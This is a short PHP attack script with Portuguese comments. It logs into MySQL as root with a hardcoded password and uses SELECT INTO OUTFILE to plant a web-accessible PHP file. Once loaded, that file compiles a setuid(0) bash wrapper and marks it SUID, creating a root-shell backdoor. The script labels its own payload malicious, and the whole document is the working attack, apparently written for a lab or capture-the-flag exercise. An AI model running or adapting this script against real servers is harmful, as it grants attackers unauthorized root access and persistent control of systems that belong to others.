<?php
$host = "mysql";
$db_name = "mysql";
$db_username = "root";
$db_password = "pujkFGC471-2j";

// Conectar ao banco de dados MySQL
$mysqli = new mysqli($host, $db_username, $db_password, $db_name);

// Verificar a conexão
if ($mysqli->connect_error) {
    die("Falha na conexão: " . $mysqli->connect_error);
}

// Comando para criar um binário SUID
$suid_command = 'echo \'int main() { setuid(0); system("/bin/bash"); }\' > /tmp/suid.c && gcc /tmp/suid.c -o /tmp/suid && chmod +s /tmp/suid';

// Cria um arquivo PHP malicioso que executa o comando acima
$php_code = '<?php shell_exec("' . addslashes($suid_command) . '"); ?>';
$query = "SELECT '$php_code' INTO OUTFILE '/app/suid.php'";

if ($mysqli->query($query) === TRUE) {
    echo "Arquivo PHP criado com sucesso.";
} else {
    echo "Erro ao criar o arquivo PHP: " . $mysqli->error;
}

$mysqli->close();
?>
